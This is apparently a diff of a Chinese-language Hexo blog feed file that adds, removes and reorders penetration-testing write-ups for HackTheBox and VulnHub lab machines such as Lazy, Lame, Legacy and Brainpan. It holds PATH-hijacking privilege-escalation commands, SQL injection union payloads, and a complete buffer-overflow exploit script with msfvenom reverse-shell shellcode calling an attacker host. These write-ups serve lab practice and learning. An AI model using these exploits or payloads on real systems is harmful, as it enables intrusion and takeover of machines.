-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -r -i id_rsa mitsos@10.10.10.18:&#x2F;var&#x2F;www&#x2F;html &#x2F;root&#x2F;Desktop&#x2F;test</span><br></pre></td></tr></table></figure>
-
-<p>首先找到index.php处，发现页面显示的逻辑是强类型比较<code>$user</code></p>
-<p><img src="/images/Lazy/2.png" alt="2"></p>
-<p><code>$user</code>变量在<code>header.php</code>处定义，使用了函数<code>getuserfromcookie</code></p>
-<p><img src="/images/Lazy/3.png" alt="3"></p>
-<p>找到<code>getuserfromcookie</code>函数，发现了漏洞</p>
-<p><img src="/images/Lazy/4.png" alt="4"></p>
-<p>这里<code>$user</code>赋予了用户名，<code>$data</code>的值是<code>user=admin=</code>，但是<code>explode(&quot;=&quot;,.....)</code>转成数组的时候，消掉了多出的<code>=</code>，造成了逻辑漏洞</p>
-<p>此时<code>$a</code>的值是user，<code>$user</code>的值是admin</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现SUID文件backup，运行可以查看<code>/etc/shadow</code></p>
-<p><img src="/images/Lazy/12.png" alt="12"></p>
-<p>ltrace查看，看来是直接通过PATH运行了cat命令</p>
-<p><img src="/images/Lazy/13.png" alt="13"></p>
-<p>PATH劫持提权</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;cat</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br><span class="line">&#x2F;home&#x2F;mitsos&#x2F;backup</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Lazy/14.png" alt="14"></p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB:Legacy</title>
-    <url>/2020/06/04/HTB-Legacy/</url>
-    <content><![CDATA[<h1 id="Legacy"><a href="#Legacy" class="headerlink" title="Legacy"></a>Legacy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Legacy/1.jpg" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Legacy/2.jpg" alt="2"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08-067"></a>MS08-067</h3><p><img src="/images/Legacy/3.jpg" alt="3"></p>
-<p>该漏洞有时候会利用失败，并导致服务崩溃，多重启2~3次即可</p>
-<p>至此我们已取得<code>system</code>权限</p>
-<p><img src="/images/Legacy/4.jpg" alt="4"></p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Windows靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -3536,6 +3486,34 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB:Lame</title>
+    <url>/2020/06/04/HTB-Lame/</url>
+    <content><![CDATA[<h1 id="Lame"><a href="#Lame" class="headerlink" title="Lame"></a>Lame</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Lame/1.jpg" alt="1"></p>
+<p>vsftpd 2.3.4</p>
+<p>smb 3.0.20</p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp允许匿名登录，不过目录没有任何发现</p>
+<p>smb没有发现可以查看的文件</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="版本漏洞"><a href="#版本漏洞" class="headerlink" title="版本漏洞"></a>版本漏洞</h3><p>根据服务vsftpd 2.3.4搜索漏洞</p>
+<p><img src="/images/Lame/2.jpg" alt="2"></p>
+<p>尝试使用该漏洞发现无法利用</p>
+<p>尝试查找smb版本漏洞</p>
+<p><img src="/images/Lame/3.jpg" alt="3"></p>
+<p>发现msf也有现成可以使用的exp</p>
+<p><img src="/images/Lame/4.jpg" alt="4"></p>
+<p>成功使用EXP，而且竟然获取了root权限</p>
+<p>最后升级交互式shell，获取flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Lame/5.jpg" alt="5"></p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB:Nibbles</title>
     <url>/2020/06/10/HTB-Nibbles/</url>
     <content><![CDATA[<h1 id="Nibbles"><a href="#Nibbles" class="headerlink" title="Nibbles"></a>Nibbles</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Nibbles/1.jpg" alt="1"></p>
@@ -3644,6 +3622,28 @@
 <p><img src="/images/node/16.jpg" alt="16"></p>
 <p>获取shell</p>
 ]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB:Laboratory</title>
+    <url>/2021/02/09/HTB-Laboratory/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="b9a7ffa64d1b8b5666575e47e4d718b88fb0c9952ab5b49720a900797bbf5a4d">6b83b1484c1bd4d3cb7f0b3881091a917e82162c1010b073de7b97f343becdb3711cf2fb7aff6959fd2e9b5c0d3d367d764be4bc55138d1e7549242a24096e939938285a1e1bf45689a869c0c3ffedf91156a33ca563286439974bd3452882de7553a8f774e6022c8738a070ff57bc422fe9d5e5d379549148b3c32c6aaa757bc72cb897b196e320aae53ca6ba3a06cf8f6ec966b523ce10808da12db4f3621749a3d76c50961670d75ce05e7a91cdafa3e5f1b1dd411f97314cea06b4b123ef4fb60e22e41bfafad4bc1afa7859dd046fbb8bf7ba1ff9d0003fa1a5905b4e53ae390ae9de97d8d1c32d61eea079a86406793ce9e5e2f6989e7e027789a881896b50d36308e3d3a2fd25e3cba060cf8d215a65a9d94cb008454d24a20ebb22e567907bae02e5c647c2b9a22ede00652293f52b353770ddc819bd87896e740fe68a9cf1ec58e9e319547c048a50f46cba0f436bc9f8dc17b7fd0a67b7065219f172803c1f601cc66ca277f81b0750f0f5fc65317a8ca92063a1713b11e633388d009ef876f7c777233881246b15b0c2eed9c0b9f307682671f2801cb2baf6b3f83ddf19f89d92e2bb0e6ff74839334b6c9c537f9c2ee64ab85ada825eb07491b95491c971c0aed44d137ede6847ed60698d69db44b406e15022a3375e65d2c4fe82e58f67bdbec01c843a659cae61c3a167fd0f43bb9e32d817c44ea4fdc1438c85bea631c7ed611cd60006efb9d8406ff3c799d0ae427a8b496277b14ac572ede248d70974b8098a43c8438e63e98b9709122442972a04e1bec9378a6100a12dfa12848c530a7b387b7690bbc06ac8c9ff8b74ad922c274b0a14a8c3da9897696f7398c74d1fa91e1f340f98cfdee6a5787ade20d11052b1e7973bb5cba05371c2d7758064b3a6d41dd092775053e9be0e9797050d3f63c05776c3e32ba6a14d9efc69a6390bb642ecba8b3a61ec00876e954edf428455940a74d649a68114417221d8f45207b1d00efb5acd4ec1de53b27b6f53a31bb870c8c774c355ab3eec1317cf5fafda7c10888b04cb7d0eec5f9d16f449d015f2dfeb6ed13d59c2ac8b1e2f3fac4403abda465d74e3fb0cfef8ce8ecd434deea7ba557739c4f68f550042209fd3e535f98e3eb7118ddaa1b604eaa9ccdcaf7e22c55a5621b93678858d7b6b182afa5fb8f335e69ae09c1af5e3228de16ec16a167a9c2923cecdedafd684d85ac75bce972180760af4f9ec26ac337ea834083bfbc9f550e1ffc898733ce7a0f1bbaf94d77c6797b86b411e01319d5f04b366c8515e107c8b14187840a76c339fbdd87dcd9128da09cb20177a1bce3788a01d816b0e6aa12509fde53b5bd07653d7a3f5700143ca20aa3549de079125eb096e35db673a4ef35d2b0ce6cab8a5632ec6c9f6fcae7509b91d3e5149e28361595f12235c5385ec6bd8f84f8002612c6489ef1464d9709413035449dc1fba7c41ecee8c1353e87615bb62eed25b343ea0144259fa3165a275b4ba513d03fbfe4c9144c2d3cc1e310cb1b4ee4f9fc172b988adf5301df1911038c46a1a61cb873ac4287d09b8f9258ef05d6b8845617af9448ccf266604edfcc91350a15e83724d02ff8da970fb8c71513e2606a0aef19600a3d7f8f4c2084c7c42b8f5be8cb20affe0e9c2e5266f3d9a2f49fa7a419c1505c03abd91a839ac0e272d45f874640589e88f07affdb7ca75783922fcd865d4b70a4aa812732621bb5505e78873d9e3d6b1caa675a30abfee8e633f04cebc906b0f49489901d891f0debdaf</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">root hash($6...V0)</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
         <category>HackTheBox</category>
       </categories>
@@ -6196,29 +6196,6 @@
       </tags>
   </entry>
   <entry>
-    <title>靶场Brainpan</title>
-    <url>/2020/10/30/%E9%9D%B6%E5%9C%BABrainpan/</url>
-    <content><![CDATA[<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>一道非常简单的x86缓冲区溢出，基本就是oscp的内容，对方在10000端口放了.exe程序，放在x86的windows下进行调试，最后生成x86/linux的payload就行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p linux&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.2.3 LPORT&#x3D;4444 -f python -b &#39;\x00&#39; -v shellcode</span><br></pre></td></tr></table></figure>
-
-<p>python脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">  <span class="comment">#badchar=&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">  shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xdb\xc7\xba\x87\x2d\xc3\xaf\xd9\x74\x24\xf4&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x5b\x31\xc9\xb1\x12\x31\x53\x17\x83\xc3\x04&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x03\xd4\x3e\x21\x5a\xeb\x9b\x52\x46\x58\x5f&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xce\xe3\x5c\xd6\x11\x43\x06\x25\x51\x37\x9f&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x05\x6d\xf5\x9f\x2f\xeb\xfc\xf7\x6f\xa3\xfd&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x04\x18\xb6\x01\x1b\x84\x3f\xe0\xab\x52\x10&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xb2\x98\x29\x93\xbd\xff\x83\x14\xef\x97\x75&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x3a\x63\x0f\xe2\x6b\xac\xad\x9b\xfa\x51\x63&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x0f\x74\x74\x33\xa4\x4b\xf7&quot;</span></span><br><span class="line">  buffer = <span class="string">&quot;A&quot;</span>*<span class="number">524</span>+<span class="string">&quot;\xf3\x12\x17\x31&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span>+shellcode+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span></span><br><span class="line"> </span><br><span class="line">  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">  </span><br><span class="line">  s.connect((<span class="string">&quot;192.168.2.179&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">  s.recv(<span class="number">1024</span>)</span><br><span class="line">  s.send(buffer)</span><br><span class="line">  s.recv(<span class="number">1024</span>)</span><br><span class="line">  s.close()</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nDone!&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nCould not connect!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>也非常简单，发现sudo权限</p>
-<p><img src="/images/brainpan/1.png" alt="1"></p>
-<p>看来它能接受一些参数，按照它的语法输入whoami命令看看</p>
-<p><img src="/images/brainpan/2.png" alt="2"></p>
-<p>  之后的会话，看起来有点像 <code>|less</code>的情况，直接<code>!/bin/sh</code></p>
-<p><img src="/images/brainpan/3.png" alt="3"></p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>靶场Bob 1.0.1</title>
     <url>/2020/09/22/%E9%9D%B6%E5%9C%BABob-1-0-1/</url>
     <content><![CDATA[<h1 id="Bob-1-0-1"><a href="#Bob-1-0-1" class="headerlink" title="Bob 1.0.1"></a>Bob 1.0.1</h1><p>kali:192.168.1.201<br>目标:192.168.1.229</p>
@@ -6260,6 +6237,29 @@
 <p><img src="/images/Bob-1-0-1/16.png" alt="16"></p>
 <p>这样就获得了bob的密码了</p>
 <p><img src="/images/Bob-1-0-1/17.png" alt="17"></p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶场Brainpan</title>
+    <url>/2020/10/30/%E9%9D%B6%E5%9C%BABrainpan/</url>
+    <content><![CDATA[<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>一道非常简单的x86缓冲区溢出，基本就是oscp的内容，对方在10000端口放了.exe程序，放在x86的windows下进行调试，最后生成x86/linux的payload就行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p linux&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.2.3 LPORT&#x3D;4444 -f python -b &#39;\x00&#39; -v shellcode</span><br></pre></td></tr></table></figure>
+
+<p>python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">  <span class="comment">#badchar=&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">  shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xdb\xc7\xba\x87\x2d\xc3\xaf\xd9\x74\x24\xf4&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x5b\x31\xc9\xb1\x12\x31\x53\x17\x83\xc3\x04&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x03\xd4\x3e\x21\x5a\xeb\x9b\x52\x46\x58\x5f&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xce\xe3\x5c\xd6\x11\x43\x06\x25\x51\x37\x9f&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x05\x6d\xf5\x9f\x2f\xeb\xfc\xf7\x6f\xa3\xfd&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x04\x18\xb6\x01\x1b\x84\x3f\xe0\xab\x52\x10&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\xb2\x98\x29\x93\xbd\xff\x83\x14\xef\x97\x75&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x3a\x63\x0f\xe2\x6b\xac\xad\x9b\xfa\x51\x63&quot;</span></span><br><span class="line">  shellcode += <span class="string">b&quot;\x0f\x74\x74\x33\xa4\x4b\xf7&quot;</span></span><br><span class="line">  buffer = <span class="string">&quot;A&quot;</span>*<span class="number">524</span>+<span class="string">&quot;\xf3\x12\x17\x31&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span>+shellcode+<span class="string">&quot;\x90&quot;</span>*<span class="number">16</span></span><br><span class="line"> </span><br><span class="line">  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">  </span><br><span class="line">  s.connect((<span class="string">&quot;192.168.2.179&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">  s.recv(<span class="number">1024</span>)</span><br><span class="line">  s.send(buffer)</span><br><span class="line">  s.recv(<span class="number">1024</span>)</span><br><span class="line">  s.close()</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nDone!&quot;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\nCould not connect!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>也非常简单，发现sudo权限</p>
+<p><img src="/images/brainpan/1.png" alt="1"></p>
+<p>看来它能接受一些参数，按照它的语法输入whoami命令看看</p>
+<p><img src="/images/brainpan/2.png" alt="2"></p>
+<p>  之后的会话，看起来有点像 <code>|less</code>的情况，直接<code>!/bin/sh</code></p>
+<p><img src="/images/brainpan/3.png" alt="3"></p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -9333,7 +9333,7 @@
 <p><strong>爆数据</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,(select email from users limit 0,1),5,6,7,8#</span><br><span class="line">1&#39; union select 1,2,3,(select pass from users limit 0,1),5,6,7,8#</span><br></pre></td></tr></table></figure>
 
-<p>得到<a href="mailto:&#x61;&#x64;&#109;&#x69;&#110;&#x40;&#105;&#x73;&#x69;&#x6e;&#x74;&#x73;&#46;&#99;&#x6f;&#109;">&#x61;&#x64;&#109;&#x69;&#110;&#x40;&#105;&#x73;&#x69;&#x6e;&#x74;&#x73;&#46;&#99;&#x6f;&#109;</a>和c2c4b4e51d9e23c02c15702c136c3e950ba9a4af<br>这个sha1比较难破解，john跑了rockyou没有破解，这里可以用somd5.com破解</p>
+<p>得到<a href="mailto:&#97;&#100;&#x6d;&#105;&#110;&#64;&#x69;&#115;&#105;&#110;&#116;&#115;&#46;&#99;&#111;&#109;">&#97;&#100;&#x6d;&#105;&#110;&#64;&#x69;&#115;&#105;&#110;&#116;&#115;&#46;&#99;&#111;&#109;</a>和c2c4b4e51d9e23c02c15702c136c3e950ba9a4af<br>这个sha1比较难破解，john跑了rockyou没有破解，这里可以用somd5.com破解</p>
 <p>得到killerbeesareflying</p>
 <p>但是这个凭据仍然无法登录</p>
 <p><img src="/images/pWnOS2.0/7.png" alt="7"></p>
